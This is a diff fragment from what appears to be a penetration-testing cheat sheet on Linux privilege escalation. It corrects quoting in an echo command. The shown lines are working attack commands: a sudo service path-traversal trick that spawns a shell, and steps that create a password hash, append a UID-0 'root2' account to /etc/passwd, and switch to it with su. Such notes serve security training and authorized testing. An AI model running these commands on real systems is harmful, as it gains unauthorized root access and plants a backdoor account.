@@ -113,7 +113,7 @@ kali@kali:~$ sudo -u steven /usr/sbin/service ../../../bin/sh    #Use sudo -u to
 
 #Writing to /etc/passwd
 openssl passwd w00t    #Create a password -> $1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.
-echo root2:$1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.:0:0:root:/root:/bin/bash' >> /etc/passwd    #Create new user in passwd file using created password
+echo 'root2:$1$rPTJ2Aqi$ZJSECPu2I/HdZsHrui68k.:0:0:root:/root:/bin/bash' >> /etc/passwd    #Create new user in passwd file using created password
 su root2      #Elevate Privs with su
 
 
